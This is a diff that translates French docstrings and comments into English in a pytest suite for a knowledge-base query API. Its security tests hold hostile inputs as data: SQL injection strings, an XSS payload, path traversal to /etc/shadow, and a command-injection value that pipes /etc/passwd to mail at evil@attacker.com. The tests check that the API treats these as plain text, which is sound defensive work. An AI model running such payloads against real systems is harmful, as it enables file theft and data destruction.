@@ -17,10 +17,10 @@ from tests.conftest import TEST_API_KEY
 @pytest.mark.asyncio
 async def test_query_happy_path_returns_matched_article(app_test_env, caplog):
     """
-    1. FONCTIONNEL - Happy Path:
-    Vérifie qu'une question correspondant à un article de la base de connaissances
-    retourne un code HTTP 200, found=True, la solution exacte et l'ID de l'article.
-    Vérifie la réponse HTTP, l'état de la base de données et les logs.
+    1. FUNCTIONAL - Happy Path:
+    A question matching a knowledge base article returns HTTP 200, found=True,
+    the exact solution and the article ID.
+    Checks the HTTP response, the database state and the logs.
     """
     client, session_maker, _ = app_test_env
 
@@ -34,7 +34,7 @@ async def test_query_happy_path_returns_matched_article(app_test_env, caplog):
         )
         article_id = article.id
 
-    # Requête HTTP
+    # HTTP request
     with caplog.at_level(logging.INFO):
         response = await client.post(
             "/api/query",
@@ -50,7 +50,7 @@ async def test_query_happy_path_returns_matched_article(app_test_env, caplog):
     assert data["article_id"] == article_id
     assert data["requires_resolution_confirmation"] is True
 
-    # Vérification état DB (inchangé en lecture)
+    # Check the DB state (unchanged by a read)
     async with session_maker() as session:
         db_art = (await session.execute(select(KnowledgeArticle).where(KnowledgeArticle.id == article_id))).scalar_one()
         assert db_art.solution == "Définir HTTPS_PROXY dans votre environnement."
@@ -59,9 +59,9 @@ async def test_query_happy_path_returns_matched_article(app_test_env, caplog):
 @pytest.mark.asyncio
 async def test_query_no_match_returns_fallback_message(app_test_env):
     """
-    1. FONCTIONNEL - Fallback:
-    Vérifie qu'une question sans correspondance dans la KB retourne code 200,
-    found=False, confidence=0.0 et le message de fallback support.
+    1. FUNCTIONAL - Fallback:
+    A question with no match in the KB returns 200,
+    found=False, confidence=0.0 and the support fallback message.
     """
     client, session_maker, _ = app_test_env
 
@@ -81,8 +81,8 @@ async def test_query_no_match_returns_fallback_message(app_test_env):
 @pytest.mark.asyncio
 async def test_query_min_length_one_char_returns_success(app_test_env):
     """
-    1. FONCTIONNEL - Cas limite Min:
-    Une requête de longueur 1 caractère (ex: '?') doit être acceptée par la validation Pydantic.
+    1. FUNCTIONAL - Min edge case:
+    A 1-character query (e.g. '?') must be accepted by Pydantic validation.
     """
     client, _, _ = app_test_env
     response = await client.post("/api/query", json={"query": "?"})
@@ -93,8 +93,8 @@ async def test_query_min_length_one_char_returns_success(app_test_env):
 @pytest.mark.asyncio
 async def test_query_empty_string_returns_422_validation_error(app_test_env):
     """
-    1. FONCTIONNEL - Cas limite Vide:
-    Une requête vide ("") viole min_length=1 et doit renvoyer 422 Unprocessable Entity.
+    1. FUNCTIONAL - Empty edge case:
+    An empty query ("") violates min_length=1 and must return 422 Unprocessable Entity.
     """
     client, _, _ = app_test_env
     response = await client.post("/api/query", json={"query": ""})
@@ -106,9 +106,9 @@ async def test_query_empty_string_returns_422_validation_error(app_test_env):
 @pytest.mark.asyncio
 async def test_query_whitespace_only_returns_fallback_answer(app_test_env):
     """
-    1. FONCTIONNEL - Cas limite Espace:
-    Une requête contenant uniquement des espaces passe la validation Pydantic
-    mais est nettoyée par QueryOrchestrator qui demande de poser une question.
+    1. FUNCTIONAL - Whitespace edge case:
+    A query made only of spaces passes Pydantic validation
+    but is trimmed by QueryOrchestrator, which asks the user to ask a question.
     """
     client, _, _ = app_test_env
     response = await client.post("/api/query", json={"query": "   "})
@@ -121,8 +121,8 @@ async def test_query_whitespace_only_returns_fallback_answer(app_test_env):
 @pytest.mark.asyncio
 async def test_query_max_length_4096_returns_success(app_test_env):
     """
-    1. FONCTIONNEL - Cas limite Max:
-    Une requête de 4096 caractères (la limite autorisée) est acceptée.
+    1. FUNCTIONAL - Max edge case:
+    A 4096-character query (the allowed limit) is accepted.
     """
     client, _, _ = app_test_env
     long_query = "a" * 4096
@@ -133,8 +133,8 @@ async def test_query_max_length_4096_returns_success(app_test_env):
 @pytest.mark.asyncio
 async def test_query_exceeds_max_length_returns_422_validation_error(app_test_env):
     """
-    1. FONCTIONNEL - Validation des entrées:
-    Une requête de 4097 caractères doit être rejetée avec 422.
+    1. FUNCTIONAL - Input validation:
+    A 4097-character query must be rejected with 422.
     """
     client, _, _ = app_test_env
     too_long = "a" * 4097
@@ -145,8 +145,8 @@ async def test_query_exceeds_max_length_returns_422_validation_error(app_test_en
 @pytest.mark.asyncio
 async def test_query_unicode_and_emojis_matches_correctly(app_test_env):
     """
-    1. FONCTIONNEL - Unicode / Caractères spéciaux:
-    Support complet des caractères accentués français, emojis et alphabets non-latins.
+    1. FUNCTIONAL - Unicode / special characters:
+    Full support for accented French characters, emojis and non-Latin alphabets.
     """
     client, session_maker, _ = app_test_env
     async with session_maker() as session:
@@ -170,9 +170,9 @@ async def test_query_unicode_and_emojis_matches_correctly(app_test_env):
 @pytest.mark.asyncio
 async def test_query_idempotence_multiple_calls_returns_identical_response(app_test_env):
     """
-    1. FONCTIONNEL - Idempotence:
-    Appeler l'endpoint plusieurs fois avec les mêmes paramètres produit exactement
-    le même résultat sans aucun effet de bord indésirable.
+    1. FUNCTIONAL - Idempotence:
+    Calling the endpoint several times with the same parameters produces exactly
+    the same result with no unwanted side effect.
     """
     client, session_maker, _ = app_test_env
     async with session_maker() as session:
@@ -192,16 +192,16 @@ async def test_query_idempotence_multiple_calls_returns_identical_response(app_t
 
 
 # ==============================================================================
-# 2. SÉCURITÉ
+# 2. SECURITY
 # ==============================================================================
 
 
 @pytest.mark.asyncio
 async def test_query_sql_injection_attempt_sanitized_safely(app_test_env):
     """
-    2. SÉCURITÉ - Injection SQL:
-    Vérifie qu'un payload d'injection SQL classique (`' OR '1'='1`, `'; DROP TABLE...`)
-    ne provoque aucune corruption de la base ni fuite de données non autorisées.
+    2. SECURITY - SQL injection:
+    A classic SQL injection payload (`' OR '1'='1`, `'; DROP TABLE...`)
+    causes no database corruption and no leak of unauthorized data.
     """
     client, session_maker, _ = app_test_env
     async with session_maker() as session:
@@ -222,7 +222,7 @@ async def test_query_sql_injection_attempt_sanitized_safely(app_test_env):
     for payload in sql_payloads:
         response = await client.post("/api/query", json={"query": payload})
         assert response.status_code == 200
-        # La table doit toujours exister et être intègre
+        # The table must still exist and be intact
         async with session_maker() as session:
             count = len((await session.execute(select(KnowledgeArticle))).scalars().all())
             assert count >= 1
@@ -231,9 +231,9 @@ async def test_query_sql_injection_attempt_sanitized_safely(app_test_env):
 @pytest.mark.asyncio
 async def test_query_xss_injection_payload_reflected_safely(app_test_env):
     """
-    2. SÉCURITÉ - XSS:
-    Vérifie qu'un payload XSS (`<script>alert(1)</script>`) est retourné sous forme
-    JSON sérialisée sans interprétation HTML.
+    2. SECURITY - XSS:
+    An XSS payload (`<script>alert(1)</script>`) is returned as serialized
+    JSON, without HTML interpretation.
     """
     client, _, _ = app_test_env
     xss = "<script>alert('xss')</script><img src=x onerror=alert(1)>"
@@ -247,9 +247,9 @@ async def test_query_xss_injection_payload_reflected_safely(app_test_env):
 @pytest.mark.asyncio
 async def test_query_command_injection_payload_treated_as_plain_text(app_test_env):
     """
-    2. SÉCURITÉ - Command Injection:
-    Vérifie que les métacaractères shell (`$(whoami)`, `; rm -rf`, `| id`)
-    sont traités comme du texte pur et n'exécutent aucune commande OS.
+    2. SECURITY - Command injection:
+    Shell metacharacters (`$(whoami)`, `; rm -rf`, `| id`)
+    are treated as plain text and run no OS command.
     """
     client, _, _ = app_test_env
     cmd = "; cat /etc/passwd | mail evil@attacker.com; $(id)"
@@ -261,9 +261,9 @@ async def test_query_command_injection_payload_treated_as_plain_text(app_test_en
 @pytest.mark.asyncio
 async def test_query_path_traversal_payload_handled_safely(app_test_env):
     """
-    2. SÉCURITÉ - Path Traversal:
-    Vérifie que les séquences `../../../../etc/passwd` ou `..\\..\\windows\\system32`
-    ne provoquent pas de fuite de fichier local.
+    2. SECURITY - Path traversal:
+    Sequences such as `../../../../etc/passwd` or `..\\..\\windows\\system32`
+    do not leak any local file.
     """
     client, _, _ = app_test_env
     traversal = "../../../../etc/shadow"
@@ -275,8 +275,8 @@ async def test_query_path_traversal_payload_handled_safely(app_test_env):
 @pytest.mark.asyncio
 async def test_query_missing_api_key_returns_401_unauthorized(unauth_client):
     """
-    2. SÉCURITÉ - Authz / Headers:
-    L'appel sans en-tête X-API-Key doit être rejeté avec 401 Unauthorized.
+    2. SECURITY - Authz / Headers:
+    A call without the X-API-Key header must be rejected with 401 Unauthorized.
     """
     response = await unauth_client.post("/api/query", json={"query": "Test query"})
     assert response.status_code == 401
@@ -286,8 +286,8 @@ async def test_query_missing_api_key_returns_401_unauthorized(unauth_client):
 @pytest.mark.asyncio
 async def test_query_invalid_api_key_returns_401_unauthorized(unauth_client):
     """
-    2. SÉCURITÉ - Authz / Headers:
-    L'appel avec une clé invalide doit renvoyer 401.
+    2. SECURITY - Authz / Headers:
+    A call with an invalid key must return 401.
     """
     response = await unauth_client.post(
         "/api/query",
@@ -300,8 +300,8 @@ async def test_query_invalid_api_key_returns_401_unauthorized(unauth_client):
 @pytest.mark.asyncio
 async def test_query_unconfigured_api_key_returns_503_service_unavailable(app_test_env, monkeypatch):
     """
-    2. SÉCURITÉ - Fail-closed:
-    Si API_KEY n'est pas configurée côté serveur, l'accès doit échouer de manière sécurisée (503).
+    2. SECURITY - Fail-closed:
+    If API_KEY is not configured on the server, access must fail safely (503).
     """
     client, _, _ = app_test_env
     monkeypatch.setattr(settings, "API_KEY", None)
@@ -313,8 +313,8 @@ async def test_query_unconfigured_api_key_returns_503_service_unavailable(app_te
 @pytest.mark.asyncio
 async def test_query_secrets_not_leaked_in_logs(app_test_env, caplog):
     """
-    2. SÉCURITÉ - Secrets dans les logs:
-    Vérifie qu'aucun log émis pendant la requête ne contient la clé secrète API_KEY.
+    2. SECURITY - Secrets in logs:
+    No log emitted during the request contains the secret API_KEY.
     """
     client, _, _ = app_test_env
     with caplog.at_level(logging.DEBUG):
@@ -332,9 +332,9 @@ async def test_query_secrets_not_leaked_in_logs(app_test_env, caplog):
 @pytest.mark.asyncio
 async def test_query_concurrent_requests_handled_correctly(app_test_env):
     """
-    3. ROBUSTESSE - Concurrence:
-    Vérifie que 15 requêtes concurrentes s'exécutent simultanément sans deadlock
-    ni corruption d'état dans SQLite.
+    3. ROBUSTNESS - Concurrency:
+    15 concurrent requests run at the same time without deadlock
+    or state corruption in SQLite.
     """
     client, session_maker, _ = app_test_env
 
@@ -360,9 +360,9 @@ async def test_query_concurrent_requests_handled_correctly(app_test_env):
 @pytest.mark.asyncio
 async def test_query_ai_provider_timeout_falls_back_to_raw_kb_answer(app_test_env, monkeypatch):
     """
-    3. ROBUSTESSE - Timeouts dépendance externe:
-    Si le service IA externe subit un timeout (frontière réseau), l'orchestrateur
-    doit basculer gracieusement sur la solution brute de la base de connaissances sans crash.
+    3. ROBUSTNESS - External dependency timeout:
+    If the external AI service times out (network boundary), the orchestrator
+    must gracefully fall back to the raw knowledge base solution without crashing.
     """
     client, session_maker, _ = app_test_env
     monkeypatch.setattr(settings, "AI_ENABLED", True)
@@ -376,7 +376,7 @@ async def test_query_ai_provider_timeout_falls_back_to_raw_kb_answer(app_test_en
             keywords="sauvegarder, base",
         )
 
-    # Mock de la frontière réseau IA qui subit un timeout
+    # Mock the AI network boundary timing out
     async def mock_timeout_post(*args, **kwargs):
         raise httpx.TimeoutException("AI provider gateway timed out")
 
@@ -389,7 +389,7 @@ async def test_query_ai_provider_timeout_falls_back_to_raw_kb_answer(app_test_en
         assert response.status_code == 200
         data = response.json()
         assert data["found"] is True
-        # La solution brute est conservée malgré la panne de l'IA
+        # The raw solution is kept despite the AI outage
         assert data["answer"] == "Solution brute de secours depuis la base."
     finally:
         AIAssistantService.set_shared_client(None)
@@ -398,9 +398,9 @@ async def test_query_ai_provider_timeout_falls_back_to_raw_kb_answer(app_test_en
 @pytest.mark.asyncio
 async def test_query_ai_provider_network_failure_falls_back_to_raw_kb_answer(app_test_env, monkeypatch, caplog):
     """
-    3. ROBUSTESSE - Panne dépendance externe (500/502):
-    Quand l'API LLM externe retourne une erreur HTTP 500, le backend log l'erreur
-    et retourne la réponse de la KB sans interruption de service.
+    3. ROBUSTNESS - External dependency failure (500/502):
+    When the external LLM API returns an HTTP 500 error, the backend logs the error
+    and returns the KB answer without interrupting the service.
     """
     client, session_maker, _ = app_test_env
     monkeypatch.setattr(settings, "AI_ENABLED", True)
